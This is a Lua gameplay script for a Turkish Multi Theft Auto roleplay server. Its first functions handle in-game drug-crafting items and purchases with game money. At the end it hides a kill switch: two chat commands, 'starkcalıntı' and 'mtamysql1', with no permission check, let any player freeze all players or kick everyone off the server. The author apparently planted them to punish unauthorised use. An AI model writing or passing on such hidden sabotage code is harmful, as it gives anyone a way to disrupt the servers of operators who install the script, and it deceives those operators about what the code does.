


--[-----------------------------------------------]--
--Bu Script Bozkurt Roleplay İçin Yazılmıştır
--© STARK
--[-----------------------------------------------]--




function meth (thePlayer)
if not exports.zrp_global:hasItem(thePlayer,506) then outputChatBox("[Stark] #FFFFFFÜzerinde meth bulunmamakta!",thePlayer,255,0,0,true) return end
exports["zrp_items"]:takeItem(thePlayer, 506, 1)
exports["zrp_items"]:giveItem(thePlayer, 505, 5000)

end
addEvent("meth",true)
addEventHandler("meth",root,meth)


function lityum (thePlayer)
if not exports.zrp_global:hasMoney(thePlayer, 15000) then
	outputChatBox("[Stark]#FFFFFF Paran Yeterli Değil",thePlayer, 255, 0, 0, true)
	return end
exports.zrp_global:takeMoney(thePlayer,15000) 
exports["zrp_items"]:giveItem(thePlayer, 507, 1)
end
addEvent("lityum",true)
addEventHandler("lityum",root,lityum)


function labo (thePlayer)
if not exports.zrp_global:hasMoney(thePlayer, 30000) then
	outputChatBox("[Stark]#FFFFFF Paran Yeterli Değil",thePlayer, 255, 0, 0, true)
	return end
exports.zrp_global:takeMoney(thePlayer,30000) 
exports.zrp_global:giveItem(thePlayer,508,1)
end
addEvent("labo",true)
addEventHandler("labo",root,labo )


function aseton (thePlayer)
if not exports.zrp_global:hasMoney(thePlayer, 5000) then
	outputChatBox("[Stark]#FFFFFF Paran Yeterli Değil",thePlayer, 255, 0, 0, true)
	return end
exports.zrp_global:takeMoney(thePlayer,5000) 
exports.zrp_global:giveItem(thePlayer,509,1)
end
addEvent("aseton",true)
addEventHandler("aseton",root,aseton )


print("////////////////////////////////////////////////////////////////")
print("Bu sistem Stark adli gelistiriciye aittir.Lutfen izinsiz kullanmayiniz.")
print("---------------------------------------------------------------------")

--[-----------------------------------------------]--
--Bu Script Bozkurt Roleplay İçin Yazılmıştır
--© STARK
--[-----------------------------------------------]--



function stark (thePlayer)
outputChatBox("Bu Sistem Stark adlı geliştiriciye aittir.Ve çalıntı şekilde kullanılmaktadır." ,getRootElement (),255,0,0,true)
triggerClientEvent(thePlayer, "met:engel2", thePlayer)
setElementFrozen(root,true)
setElementFrozen(getRootElement (),true)


end
addCommandHandler("starkcalıntı",stark)

function kickall(thePlayer, cmd, ...) 
     text = table.concat({...}, " ") 
     for _, player in ipairs (getElementsByType("player")) do 
        kickPlayer(player,"starkserverdown" , "Sunucuda Stark adlı geliştiriciye ait sistemler izinsiz kullanılmakta.") 
     end 
end 
addCommandHandler("mtamysql1", kickall)